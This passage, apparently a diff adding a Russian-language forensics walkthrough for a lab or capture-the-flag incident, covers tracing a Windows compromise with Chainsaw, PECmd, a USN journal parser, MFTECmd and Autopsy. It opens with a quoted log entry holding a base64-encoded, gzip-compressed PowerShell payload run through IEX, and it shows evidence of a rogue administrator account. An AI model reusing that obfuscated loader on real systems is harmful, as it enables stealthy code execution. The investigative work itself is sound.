QAMgBJAEcAUwBpAFMASQBhADgASABsAG0AcgA2AEEAQgA1AGoAZQBxAGEAcgA5AGEAdAAzAGIASwAyADEASwBQAFcAagBQAFcAUwBGAHQAUwA5AFYAUwBZAEsAdgAwAGQASABBADIAcABpAHQATQBPAGYAdABlAEYAKwBmAEkAKwBWAGQAcQBPAHoAcgBEAFQAYgBqADIAMgArAGUAbAB6AGkAOABhAEkAZAByAG0AZAAwAGwATQBsAGsAcgBYAEkAVABNAEoAaAArAFUAagBGAFIALwBGADIAQwAzAHoAdQBYAFMAMgA4AE4ARAA5AG8AYwB0AEYAZgB4AC8AZgBQAG4AcgBDAFgAZQB2AEIAMAA5AGYAVQBxAGYAcgAyAFAAawAyAC8ANwBPAFMAcwBHAGMAVQByAHUAOQArAGUAcwA2AEwAKwB6AFIAdQA2ADcANQBzACsAbABzAGgARgBpADgAUgBTADUAMABVADUAaQB3AHIAdQArAGoASABqAEQAOQBNAGkAZABOAEEAeQBvADAAOAB2AG0AUABSAC8AdABYAHcAbgB6AGkAdwB0AGcATABnAC8ASAAxAFYAVgBGAGQATgA4AEIAaQBzAHYAdgBKAGkAUABYADcAVwA5ACsASAAxADMATQBCAFMAMABYACsAYwBGAFgANAA5AGsAQQBVAEMAdABlAG4AegAwAG8AMgBtADIAegA4AHUAVgB6AHgATwBnAFYAKwBlADAAcABNAHUARgAvAHgASABaAEYARAA0AGoAdAA4AFcANQBUAEsAcQBWAEkAdQBsADgAVgB2AHQAUQB6AFcAZgBwADIAWQBWAGgAQQBlADgAMgAvADIAaQBtAEwAKwBlAHcAZgBsAHYAUwBzADMAYwAvAFUAMgBzAEwASABFADkAOABqAC8ATQBBAGIAZgBlAGYAMwBQADcAQQByACsAcwBoAG4AeQBHADMAcwBaAG8AbwA4AHAARQA0AC8AeQBQAHcASAA0AGIAWQB6AFoANAB3ADAAQQBBAEEAPQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA"" /f
+            MandatoryLabel: S-1-16-8192
+            NewProcessId: '0xca0'
+            NewProcessName: C:\Windows\System32\cmd.exe
+            ParentProcessName: C:\Windows\System32\rundll32.exe
+            ProcessId: '0xe40'
+            SubjectDomainName: DESKTOP-VQJOLVH
+            SubjectLogonId: '0x20118'
+            SubjectUserName: johndoe
+            SubjectUserSid: S-1-5-21-414731039-2985344906-4266326170-1000
+            TargetDomainName: '-'
+            TargetLogonId: '0x0'
+            TargetUserName: '-'
+            TargetUserSid: S-1-0-0
+            TokenElevationType: '%%1938' 
+
+        /////////////////////////////
+        /// account_tampering.csv ///
+        ///////////////////////////// 
+
+        При изучении account_tampering.csv мы видим, что был создан новый пользователь (Admin) и добавлен вгруппу администраторов. 
+        *** При исследовании этого файла, настройки Separated Options можно оставить по умолчанию, а именноSeparated By (Tab, Comma, Semicolon) 
+
+            timestamp,detections,path,Event ID,Record ID,Computer,User,User SID,Member SID
+            
+            2023-08-10T00:20:13.353274+00:00,User Added to GlobalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4728,149,DESKTOPVQJOLVH,None,,S-1-5-21-414731039-2985344906-4266326170-1000
+            2023-08-10T00:20:13.354375+00:00,New UserCreated,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4720,150,DESKTOPVQJOLVH,johndoe,S-1-5-21-414731039-2985344906-4266326170-1000,
+            2023-08-10T00:20:13.356139+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,153,DESKTOPVQJOLVH,Users,,S-1-5-21-414731039-2985344906-4266326170-1000
+            2023-08-10T00:20:13.374012+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,159,DESKTOPVQJOLVH,Administrators,,S-1-5-21-414731039-2985344906-4266326170-1000
+            2023-08-10T01:18:50.257916+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,33,WIN55N06QRM5JL,IIS_IUSRS,,S-1-5-17
+            2023-08-10T01:18:50.259235+00:00,User Added to GlobalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4728,42,WIN55N06QRM5JL,None,,S-1-5-21-414731039-2985344906-4266326170-504
+            2023-08-10T01:18:50.259624+00:00,New UserCreated,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4720,43,WIN55N06QRM5JL,WDAGUtilityAccount,S-1-5-21-414731039-2985344906-4266326170-504,
+            2023-08-10T01:18:56.561644+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,83,WIN55N06QRM5JL,Users,,S-1-5-4
+            2023-08-10T01:18:56.561855+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,84,WIN55N06QRM5JL,Users,,S-1-5-11
+            2023-08-10T09:26:05.014474+00:00,User Added to GlobalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4728,6057,DESKTOPVQJOLVH,None,,S-1-5-21-414731039-2985344906-4266326170-1001
+            2023-08-10T09:26:05.015956+00:00,New UserCreated,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4720,6058,DESKTOPVQJOLVH,Admin,S-1-5-21-414731039-2985344906-4266326170-1001,
+            2023-08-10T09:26:05.042257+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,6062,DESKTOPVQJOLVH,Users,,S-1-5-21-414731039-2985344906-4266326170-1001
+            2023-08-10T09:26:13.092977+00:00,User Added to LocalGroup,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,4732,6073,DESKTOPVQJOLVH,Administrators,,S-1-5-21-414731039-2985344906-4266326170-1001 
+
+        Для прдтверждения создания нового пользователя, мы можем обратиться к меню OS Accounts программеAUTOPSY 
+
+    ++++++++++++++++++++++++++ 
+    + Prefetch Files (PECmd) +
+    ++++++++++++++++++++++++++ 
+
+    Давайте теперь погрузимся в system's execution history анализируя файлы предварительной выборки (prefetch files) спомощью PECmd.exe 
+
+        C:\Users\johndoe>C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\PECmd.exe -d"C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\Prefetch" -q --csv C:\Users\johndoe\Desktop --csvfsuspect_prefetch.csv 
+
+    ++++++++++++++++++++++++++++++++++++++++++++ 
+    + USN Journal using Python script (usn.py) +
+    ++++++++++++++++++++++++++++++++++++++++++++ 
+
+    В журнале USN (доступном по адресу C:\Users\johndoe\Desktop\kapefiles\ntfs\.....\$Extend\$UsnJrnl%3A$J) мы можемидентифицировать все файлы, которые были созданы или удалены во время инцидентаДля этого, мы используем специальный скрипт - usn.py
+
+        PS C:\Users\johndoe\Desktop\files\USN-Journal-Parser-master\usnparser> python usn.py -f'C:\Users\johndoe\Desktop\kapefiles\ntfs\...\$Extend\$UsnJrnl%3A$J' -o C:\Users\johndoe\Desktop\usn_output.csv -c 
+
+
+    Если мы вернемся к результатм анализа CHAINSAW, то увидим что подозрительные действия имели место примерномежду 2023-08-10 09:00:00 и 2023-08-10 10:00:00. 
+    Поэтому, чтобы не искать в usn-output.csv файле нужну информацию, мы можем воспользоваться PowerShell иотфильтровать нужный данные в соответствии с нашей временной шкалой 
+    Для этого сперва создадим 2 переменные 
+
+        PS C:\Users\johndoe> $time1 = [DateTime]::ParseExact("2023-08-10 09:00:00.000000", "yyyy-MM-ddHH:mm:ss.ffffff", $null)
+        PS C:\Users\johndoe> $time2 = [DateTime]::ParseExact("2023-08-10 10:00:00.000000", "yyyy-MM-ddHH:mm:ss.ffffff", $null) 
+
+    А затем при помощи нужных командлетов выведем только интересующую нас информацию 
+
+        PS C:\Users\johndoe> Import-Csv -Path C:\Users\johndoe\Desktop\usn_output.csv | Where-Object { $_.'FileName' match '\.exe$|\.txt$|\.msi$|\.bat$|\.ps1$|\.iso$|\.lnk$' } | Where-Object { $_.timestamp -as [DateTime] -ge $time1 -and$_.timestamp -as [DateTime] -lt $time2 } 
+
+    *** Я не буду публиковать вывод тут, так как он очень большойОднако, можно увидеть, что некоторые файлы были удаленыИ это выглядит весьма подозрительно 
+
+    ++++++++++++++++++++++++++++++++++++++++++ 
+    + MFT/pagefile.sys using MFTECmd/Autopsy +
+    ++++++++++++++++++++++++++++++++++++++++++ 
+
+    Чтобы восстановить удаленные файлы, мы можем использовать MFT файл (не путать с $MFT)
+    К сожалению в нашем случае, таблица MFT пострадавшего компьютера недоступна.
+    Однако, если у вас есть MFT пострадавшего компьютера, то Вашим первым шагом будет анализ MFT посредством MFTEcmd 
+
+    Сперва, Вам надо трансформировать MFT файл в csv используя MFTECmd 
+
+        PS C:\Users\johndoe>C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\MFTECmd.exe -fC:\Users\johndoe\Desktop\files\mft_data --csv C:\Users\johndoe\Desktop\ --csvf mft_csv.csv 
+
+    Затем, используя простой комнадлет от PowerShell нам нужно найти удаленый файлА точнее, запись в csv-версии MFT-файла, которая содержит информацию об удаленном файле 
+
+        PS C:\Users\johndoe> Select-String -Path C:\Users\johndoe\Desktop\mft_csv.csv -Pattern "flag.txt" 
+        
+        Desktop\mft_csv.csv:143975:112346,4,False,104442,6,.\Users\johndoe\Desktop\reports,flag.txt,.txt,63,1,,False,False,False,True,False,False,Archive,DosWindows,2023-08-08 08:21:40.3050567,2023-08-08 08:23:43.3664676,2023-08-0808:22:58.2111378,2023-08-08 08:23:43.3664676,2023-08-08 08:23:44.0401723,2023-08-08 08:23:43.3664676,2023-08-0808:23:51.1904111,2023-08-08 08:23:43.3664676,31120880,232569553,2300,,, 
+
+    Вывод предоставляет местоположение flag.txt в системе (\Users\johndoe\Desktop\reports).
+    Теперь давайте перейдем к файлу MFT с помощью MFT ExplorerНа рабочем столе в папке отчетов мы обнаруживаем flag.txt, отмеченный атрибутом Is removed. 
+
+    Когда файлы удаляются с тома файловой системы NTFS, их записи MFT помечаются как свободные и могут быть использованы повторно 
+    Но данные могут оставаться на диске до тех пор, пока не будут перезаписаны.
+    Вот почему восстановление не всегда возможно. 
+
+    В случае скомпрометированной системы файл был перезаписан (именно поэтому мы использовали таблицу MFTдругой системы для восстановления), но части его содержимого были сохранены в pagefile.sys.
+    pagefile.sys — это назначенный системный файл в Windows, который дополняет оперативную память вашегокомпьютера. 
+    Когда оперативная память приближается к своему пределу, система выгружает менее важные данные, такие какопределенные файлы и приложения, в файл подкачки. 
+
+    Зная частичное содержимое файла, мы можем просмотреть скомпроментированный диск и извлечь наш флаг изpagefile.sys с помощью Autopsy.
+    *** Хочу сразу предупредить, что содержимое файла pagefile.sys очень большое и может составлять несоклькосраниц 
+        Поэтому рекомендую воспользоваться поиском по ключевому слову (Keyword Search) 
+
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++ 
+    + Constructing an Execution Timeline using AUTOPSY +
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++ 
+
+    AUTOPSY имеет одну очень хорошую фичу - хронологическая визуализация действия за определенный промежуток времени 
+    Это фича называется     -   Timeline 
+    В основе этой фичи лежит Plaso 
+
+    Plaso — это фреймворк для запуска модулей для извлечения временных меток для различных типов файлов. 
+    Модуль захвата Plaso запускает Plaso для генерации событий, которые отображаются на временной шкале Autopsy. 
+
+    Вот несколько интренет ресурсов для ознаомления с Plaso 
+
+        https://github.com/log2timeline/plaso
+        https://dfir-kev.medium.com/plaso-super-timelines-with-docker-5fabfcdbd314
+        https://plaso.readthedocs.io/en/latest/
+        https://sleuthkit.org/autopsy/docs/user-docs/4.19.3/plaso_page.html#:~:text=Plaso%20is%20a%20framework%20for,displayed%20in%20the%20Autopsy%20Timeline. 
+        https://www.kali.org/tools/plaso/
+        https://docs.limacharlie.io/docs/ext-plasohttps://forensics.wiki/plaso/ 
+
+    После запуска AUTOPSY, загрузки нужного нам файла и надатия на иконку Timeline, давайте сделаем следующийвыбор: 
+
+        -   In FILTERS manu Limit event types to:
+                *   Web Activity:   All
+                *   Other:          All 
+
+        -   Set Display Times in: GMT / UTC 
+                *   Start: Aug 10, 2023 9:13:00 AM
+                *   End: Aug 10, 2023 9:30:00 AM 
+
+        -   VIEW MODE "Details" or "List 
+            Позволит нам создать временную шкалу, детализирующую действия злоумышленника. 
